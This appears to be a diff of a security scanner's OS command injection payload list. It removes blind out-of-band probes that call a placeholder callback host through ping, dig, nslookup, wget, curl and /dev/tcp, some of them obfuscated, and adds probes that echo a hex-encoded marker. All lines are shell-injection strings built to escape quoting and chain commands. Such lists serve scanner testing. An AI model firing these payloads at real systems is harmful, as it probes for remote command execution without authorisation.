-Blind Payload: '; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; '
-Blind Payload: '; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; '
-Blind Payload: "; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; "
-Blind Payload: "; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; "
-Blind Payload: '; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; '
-Blind Payload: '; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; '
-Blind Payload: ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb
-Blind Payload: ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb
-Blind Payload: bash -c "$@" x eval ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb;
-Blind Payload: bash -c "$@" x eval ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb;
-Blind Payload: $(ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb)
-Blind Payload: $(ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb)
-Blind Payload: `ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb`
-Blind Payload: `ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb`
-Blind Payload: ; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; 
-Blind Payload: ; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; 
-Blind Payload: ; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; 
-Blind Payload: ; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; 
-Blind Payload:  && false || dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb && 
-Blind Payload:  && false || dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb && 
-Blind Payload:  && false || dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1 && 
-Blind Payload:  && false || dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1 && 
-Blind Payload: "; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; "
-Blind Payload: "; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; "
-Blind Payload: '; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; '
-Blind Payload: '; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; '
-Blind Payload: "; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; "
-Blind Payload: "; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; "
-Blind Payload: '; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; '
-Blind Payload: '; dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; '
-Blind Payload: dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb
-Blind Payload: dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb
-Blind Payload: bash -c "$@" x eval dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb;
-Blind Payload: bash -c "$@" x eval dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb;
-Blind Payload: $(dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb)
-Blind Payload: $(dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb)
-Blind Payload: `dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb`
-Blind Payload: `dig 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb`
-Blind Payload: ; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; 
-Blind Payload: ; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; 
-Blind Payload: ; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; 
-Blind Payload: ; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; 
-Blind Payload:  && false || nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb && 
-Blind Payload:  && false || nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb && 
-Blind Payload:  && false || nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1 && 
-Blind Payload:  && false || nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1 && 
-Blind Payload: "; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; "
-Blind Payload: "; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; "
-Blind Payload: '; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; '
-Blind Payload: '; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; '
-Blind Payload: "; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; "
-Blind Payload: "; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; "
-Blind Payload: '; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; '
-Blind Payload: '; nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; '
-Blind Payload: nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb
-Blind Payload: nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb
-Blind Payload: bash -c "$@" x eval nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb;
-Blind Payload: bash -c "$@" x eval nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb;
-Blind Payload: $(nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb)
-Blind Payload: $(nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb)
-Blind Payload: `nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb`
-Blind Payload: `nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb`
-Blind Payload: ; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null; 
-Blind Payload: ; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null; 
-Blind Payload: ; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null 2>&1; 
-Blind Payload: ; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null 2>&1; 
-Blind Payload:  && false || wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null && 
-Blind Payload:  && false || wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null && 
-Blind Payload:  && false || wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null 2>&1 && 
-Blind Payload:  && false || wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null 2>&1 && 
-Blind Payload: "; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null; "
-Blind Payload: "; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null; "
-Blind Payload: '; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null; '
-Blind Payload: '; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null; '
-Blind Payload: "; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null 2>&1; "
-Blind Payload: "; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null 2>&1; "
-Blind Payload: '; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null 2>&1; '
-Blind Payload: '; wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null 2>&1; '
-Blind Payload: wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null
-Blind Payload: wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null
-Blind Payload: bash -c "$@" x eval wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null;
-Blind Payload: bash -c "$@" x eval wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null;
-Blind Payload: $(wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null)
-Blind Payload: $(wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null)
-Blind Payload: `wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null`
-Blind Payload: `wget http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ -O /dev/null`
-Blind Payload: ; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/; 
-Blind Payload: ; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/; 
-Blind Payload: ; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ 2>&1; 
-Blind Payload: ; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ 2>&1; 
-Blind Payload:  && false || curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ && 
-Blind Payload:  && false || curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ && 
-Blind Payload:  && false || curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ 2>&1 && 
-Blind Payload:  && false || curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ 2>&1 && 
-Blind Payload: "; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/; "
-Blind Payload: "; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/; "
-Blind Payload: '; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/; '
-Blind Payload: '; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/; '
-Blind Payload: "; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ 2>&1; "
-Blind Payload: "; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ 2>&1; "
-Blind Payload: '; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ 2>&1; '
-Blind Payload: '; curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/ 2>&1; '
-Blind Payload: curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/
-Blind Payload: curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/
-Blind Payload: bash -c "$@" x eval curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/;
-Blind Payload: bash -c "$@" x eval curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/;
-Blind Payload: $(curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/)
-Blind Payload: $(curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/)
-Blind Payload: `curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/`
-Blind Payload: `curl http://0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/`
-Blind Payload: ; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; 
-Blind Payload: ; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; 
-Blind Payload: ; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; 
-Blind Payload: ; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; 
-Blind Payload:  && false || curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb && 
-Blind Payload:  && false || curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb && 
-Blind Payload:  && false || curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1 && 
-Blind Payload:  && false || curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1 && 
-Blind Payload: "; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; "
-Blind Payload: "; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; "
-Blind Payload: '; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; '
-Blind Payload: '; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; '
-Blind Payload: "; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; "
-Blind Payload: "; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; "
-Blind Payload: '; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; '
-Blind Payload: '; curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; '
-Blind Payload: curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb
-Blind Payload: curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb
-Blind Payload: bash -c "$@" x eval curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb;
-Blind Payload: bash -c "$@" x eval curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb;
-Blind Payload: $(curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb)
-Blind Payload: $(curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb)
-Blind Payload: `curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb`
-Blind Payload: `curl 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb`
-Blind Payload: ; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80; 
-Blind Payload: ; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80; 
-Blind Payload: ; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 2>&1; 
-Blind Payload: ; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 2>&1; 
-Blind Payload:  && false || true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 && 
-Blind Payload:  && false || true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 && 
-Blind Payload:  && false || true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 2>&1 && 
-Blind Payload:  && false || true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 2>&1 && 
-Blind Payload: "; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80; "
-Blind Payload: "; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80; "
-Blind Payload: '; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80; '
-Blind Payload: '; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80; '
-Blind Payload: "; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 2>&1; "
-Blind Payload: "; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 2>&1; "
-Blind Payload: '; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 2>&1; '
-Blind Payload: '; true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80 2>&1; '
-Blind Payload: true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80
-Blind Payload: true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80
-Blind Payload: bash -c "$@" x eval true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80;
-Blind Payload: bash -c "$@" x eval true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80;
-Blind Payload: $(true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80)
-Blind Payload: $(true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80)
-Blind Payload: `true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80`
-Blind Payload: `true < /dev/tcp/0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb/80`
-Blind Payload: ; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"; 
-Blind Payload: ; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"; 
-Blind Payload: ; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" 2>&1; 
-Blind Payload: ; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" 2>&1; 
-Blind Payload:  && false || true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" && 
-Blind Payload:  && false || true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" && 
-Blind Payload:  && false || true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" 2>&1 && 
-Blind Payload:  && false || true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" 2>&1 && 
-Blind Payload: "; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"; "
-Blind Payload: "; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"; "
-Blind Payload: '; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"; '
-Blind Payload: '; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"; '
-Blind Payload: "; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" 2>&1; "
-Blind Payload: "; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" 2>&1; "
-Blind Payload: '; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" 2>&1; '
-Blind Payload: '; true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)" 2>&1; '
-Blind Payload: true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"
-Blind Payload: true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"
-Blind Payload: bash -c "$@" x eval true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)";
-Blind Payload: bash -c "$@" x eval true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)";
-Blind Payload: $(true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)")
-Blind Payload: $(true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)")
-Blind Payload: `true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"`
-Blind Payload: `true < "$(printf \\x2fdev\\x2ftcp\\x2f0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb\\x2f80)"`
-Blind Payload:  & ping -n 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb & 
-Blind Payload:  & ping -n 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb & 
-Blind Payload:  & nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb & 
-Blind Payload:  & nslookup 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb & 
+; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; 
+; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; 
+; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; 
+; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; 
+ && false || echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" && 
+ && false || echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" && 
+ && false || echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1 && 
+ && false || echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1 && 
